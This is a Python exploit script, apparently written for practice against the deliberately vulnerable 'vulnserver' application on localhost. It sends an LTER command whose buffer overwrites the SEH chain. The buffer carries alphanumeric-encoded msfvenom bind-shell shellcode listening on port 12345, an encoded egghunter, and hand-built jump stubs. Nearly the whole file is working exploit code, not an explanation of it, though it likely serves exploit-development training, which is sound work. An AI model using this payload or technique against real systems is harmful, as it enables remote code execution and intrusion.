import struct
import socket

VULNSRVR_CMD = b"LTER "  # change me
CRASH_LEN = 4005  # change me
OFFSET = 3515  # change me
SLED_LENGTH = 20

target = ("127.0.0.1", 9999)  # vulnserver

# msfvenom -p windows/shell_bind_tcp LPORT=12345 -f python -v shellcode -b '\x00' EXITFUNC=thread -e x86/alpha_mixed BUFFERREGISTER=edi
# Payload size: 710 bytes
shellcode =  b""
shellcode += b"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x4b"
shellcode += b"\x58\x4d\x52\x75\x50\x57\x70\x63\x30\x33\x50"
shellcode += b"\x4f\x79\x59\x75\x56\x51\x79\x50\x43\x54\x4c"
shellcode += b"\x4b\x76\x30\x70\x30\x4c\x4b\x46\x32\x56\x6c"
shellcode += b"\x4c\x4b\x56\x32\x54\x54\x6c\x4b\x62\x52\x35"
shellcode += b"\x78\x56\x6f\x38\x37\x31\x5a\x65\x76\x56\x51"
shellcode += b"\x4b\x4f\x6e\x4c\x47\x4c\x63\x51\x71\x6c\x75"
shellcode += b"\x52\x74\x6c\x71\x30\x6f\x31\x78\x4f\x56\x6d"
shellcode += b"\x37\x71\x59\x57\x58\x62\x58\x72\x33\x62\x62"
shellcode += b"\x77\x6e\x6b\x71\x42\x52\x30\x6c\x4b\x61\x5a"
shellcode += b"\x35\x6c\x4c\x4b\x62\x6c\x47\x61\x52\x58\x4a"
shellcode += b"\x43\x30\x48\x76\x61\x38\x51\x50\x51\x6c\x4b"
shellcode += b"\x71\x49\x35\x70\x36\x61\x48\x53\x4c\x4b\x57"
shellcode += b"\x39\x35\x48\x48\x63\x74\x7a\x52\x69\x4c\x4b"
shellcode += b"\x74\x74\x6e\x6b\x55\x51\x78\x56\x75\x61\x79"
shellcode += b"\x6f\x4c\x6c\x5a\x61\x48\x4f\x66\x6d\x65\x51"
shellcode += b"\x4f\x37\x57\x48\x69\x70\x54\x35\x58\x76\x65"
shellcode += b"\x53\x63\x4d\x58\x78\x77\x4b\x63\x4d\x65\x74"
shellcode += b"\x43\x45\x79\x74\x46\x38\x6e\x6b\x50\x58\x56"
shellcode += b"\x44\x76\x61\x58\x53\x51\x76\x6e\x6b\x76\x6c"
shellcode += b"\x62\x6b\x6c\x4b\x53\x68\x45\x4c\x67\x71\x58"
shellcode += b"\x53\x6c\x4b\x33\x34\x4c\x4b\x36\x61\x38\x50"
shellcode += b"\x4e\x69\x53\x74\x61\x34\x46\x44\x53\x6b\x43"
shellcode += b"\x6b\x30\x61\x31\x49\x50\x5a\x62\x71\x4b\x4f"                                                                
shellcode += b"\x4d\x30\x43\x6f\x43\x6f\x51\x4a\x4e\x6b\x32"                                                                
shellcode += b"\x32\x78\x6b\x6c\x4d\x73\x6d\x72\x48\x65\x63"                                                                
shellcode += b"\x57\x42\x47\x70\x35\x50\x51\x78\x71\x67\x61"                                                                
shellcode += b"\x63\x56\x52\x71\x4f\x51\x44\x63\x58\x30\x4c"                                                                
shellcode += b"\x43\x47\x67\x56\x65\x57\x39\x6f\x48\x55\x38"                                                                
shellcode += b"\x38\x6a\x30\x47\x71\x33\x30\x67\x70\x55\x79"                                                                
shellcode += b"\x49\x54\x50\x54\x66\x30\x51\x78\x71\x39\x6d"                                                                
shellcode += b"\x50\x30\x6b\x37\x70\x79\x6f\x4e\x35\x33\x5a"                                                                
shellcode += b"\x36\x68\x70\x59\x52\x70\x39\x72\x6b\x4d\x67"                                                                
shellcode += b"\x30\x32\x70\x31\x50\x50\x50\x65\x38\x78\x6a"                                                                
shellcode += b"\x36\x6f\x39\x4f\x4d\x30\x39\x6f\x69\x45\x4c"                                                                
shellcode += b"\x57\x61\x78\x43\x32\x47\x70\x36\x50\x77\x49"                                                                
shellcode += b"\x4d\x59\x68\x66\x52\x4a\x42\x30\x43\x66\x76"                                                                
shellcode += b"\x37\x61\x78\x49\x52\x49\x4b\x67\x47\x33\x57"                                                                
shellcode += b"\x59\x6f\x6e\x35\x32\x77\x50\x68\x38\x37\x78"                                                                
shellcode += b"\x69\x46\x58\x6b\x4f\x69\x6f\x5a\x75\x72\x77"                                                                
shellcode += b"\x70\x68\x31\x64\x5a\x4c\x35\x6b\x78\x61\x49"                                                                
shellcode += b"\x6f\x4e\x35\x72\x77\x6f\x67\x35\x38\x31\x65"
shellcode += b"\x62\x4e\x42\x6d\x55\x31\x39\x6f\x6e\x35\x65"
shellcode += b"\x38\x71\x73\x50\x6d\x75\x34\x45\x50\x4e\x69"
shellcode += b"\x6a\x43\x66\x37\x32\x77\x33\x67\x74\x71\x38"
shellcode += b"\x76\x52\x4a\x66\x72\x62\x79\x46\x36\x39\x72"
shellcode += b"\x49\x6d\x45\x36\x69\x57\x43\x74\x75\x74\x45"
shellcode += b"\x6c\x56\x61\x53\x31\x4c\x4d\x63\x74\x36\x44"
shellcode += b"\x56\x70\x68\x46\x43\x30\x61\x54\x56\x34\x72"
shellcode += b"\x70\x62\x76\x53\x66\x52\x76\x63\x76\x73\x66"
shellcode += b"\x50\x4e\x53\x66\x72\x76\x31\x43\x43\x66\x71"
shellcode += b"\x78\x74\x39\x6a\x6c\x55\x6f\x6e\x66\x39\x6f"
shellcode += b"\x78\x55\x6c\x49\x6b\x50\x72\x6e\x33\x66\x62"
shellcode += b"\x66\x59\x6f\x64\x70\x75\x38\x75\x58\x4e\x67"
shellcode += b"\x75\x4d\x73\x50\x4b\x4f\x6e\x35\x4d\x6b\x4d"
shellcode += b"\x30\x57\x6d\x66\x4a\x55\x5a\x35\x38\x39\x36"
shellcode += b"\x6f\x65\x6f\x4d\x4f\x6d\x39\x6f\x7a\x75\x35"
shellcode += b"\x6c\x44\x46\x71\x6c\x74\x4a\x6b\x30\x79\x6b"
shellcode += b"\x6d\x30\x62\x55\x35\x55\x6d\x6b\x50\x47\x37"
shellcode += b"\x63\x73\x42\x42\x4f\x63\x5a\x73\x30\x63\x63"
shellcode += b"\x69\x6f\x4b\x65\x41\x41"

# long jump, lands at 0x34 from start of buffer 
second_neg_jump  = b"\x25\x50\x30\x24\x41\x25\x2a\x4a\x4a\x2a\x54\x58\x2d\x65\x72\x29"
second_neg_jump += b"\x7e\x2d\x37\x58\x74\x2b\x2d\x60\x22\x62\x56\x50\x5C\x25\x50\x30"
second_neg_jump += b"\x24\x41\x25\x2a\x4a\x4a\x2a\x2d\x3e\x7f\x22\x26\x2d\x6f\x7f\x21"
second_neg_jump += b"\x22\x2d\x54\x70\x2b\x27\x50\x25\x50\x30\x24\x41\x25\x2a\x4a\x4a"
second_neg_jump += b"\x2a\x2d\x38\x21\x22\x7f\x2d\x74\x2c\x7e\x3d\x2d\x6b\x22\x6d\x43"
second_neg_jump += b"\x50"

# push esp	
# pop eax	
# sub eax,0x250
# jmp eax
# python opt_encoder.py -s 54582d50020000ffe0 -p -m -e 0x018beca4,0x018bffb4
# Shellcode length: 92
second_neg_jump  = b"\x54\x58\x2d\x22\x2c\x3e"
second_neg_jump += b"\x7f\x2d\x70\x62\x62\x37\x2d\x5e\x5e\x5f\x49\x50\x5C\x25\x50\x30"
second_neg_jump += b"\x24\x41\x25\x2a\x4a\x4a\x2a\x2d\x5a\x78\x2a\x27\x2d\x73\x7b\x22"
second_neg_jump += b"\x27\x2d\x53\x7b\x22\x21\x50\x25\x50\x30\x24\x41\x25\x2a\x4a\x4a"
second_neg_jump += b"\x2a\x2d\x72\x37\x6f\x27\x2d\x4a\x7f\x6f\x5f\x2d\x42\x49\x21\x7a"
second_neg_jump += b"\x50\x25\x50\x30\x24\x41\x25\x2a\x4a\x4a\x2a\x2d\x7f\x7f\x76\x30"
second_neg_jump += b"\x2d\x2d\x28\x5c\x7f\x50"

# msfvenom -p generic/custom PAYLOADFILE=./binary-egghunter.bin -e x86/opt_sub VALIDCHARSET=ALPHANUM BUFFEROFFSET=-297 -f python -v encoded_egg --platform windows --arch x86
# Payload size: 157 bytes
encoded_egg =  b""
encoded_egg += b"\x54\x58\x2d\x2a\x7e\x7d\x7d\x2d\x21\x61\x61"
encoded_egg += b"\x61\x2d\x21\x21\x21\x21\x50\x5c\x25\x21\x21"
encoded_egg += b"\x21\x21\x25\x40\x40\x40\x40\x2d\x49\x7e\x7d"
encoded_egg += b"\x7e\x2d\x21\x79\x61\x78\x2d\x21\x21\x21\x21"
encoded_egg += b"\x50\x2d\x7e\x2f\x7e\x7e\x2d\x27\x21\x76\x7e"
encoded_egg += b"\x2d\x21\x21\x21\x3b\x50\x2d\x7e\x7e\x7e\x72"
encoded_egg += b"\x2d\x7e\x7e\x7e\x21\x2d\x4f\x45\x62\x21\x50"
encoded_egg += b"\x2d\x33\x38\x7e\x7e\x2d\x21\x21\x7e\x2a\x2d"
encoded_egg += b"\x21\x21\x2b\x21\x50\x2d\x71\x71\x7e\x79\x2d"
encoded_egg += b"\x21\x21\x6a\x21\x2d\x21\x21\x21\x21\x50\x2d"
encoded_egg += b"\x7e\x6a\x4a\x7e\x2d\x7e\x21\x21\x7e\x2d\x3e"
encoded_egg += b"\x21\x21\x49\x50\x2d\x7e\x7e\x38\x7e\x2d\x54"
encoded_egg += b"\x76\x21\x25\x2d\x21\x21\x21\x21\x50\x2d\x67"
encoded_egg += b"\x7e\x45\x28\x2d\x21\x21\x21\x21\x2d\x21\x21"
encoded_egg += b"\x21\x21\x50"

second_jump_offset = 3391
encoded_egg_offset = 2904
cmd_offset = len(VULNSRVR_CMD) + len(b"\xde\xad\xbe\xef")

payload = VULNSRVR_CMD
payload += b"\xde\xad\xbe\xef"
payload += b"c0d3c0d3"
payload += shellcode
payload += b"A" * (encoded_egg_offset - len(payload) + cmd_offset)
payload += encoded_egg
payload += b"B" * (second_jump_offset - len(payload) + cmd_offset)
payload += second_neg_jump  
payload += b"C" * (OFFSET - len(payload) + cmd_offset)
payload += b"\x70\xff\x71\xff"  # nSEH
payload += struct.pack("<I", 0x6250172b)  # SEH
payload += b"D" * (CRASH_LEN - len(payload))

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome to Vulnerable Server! ... 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
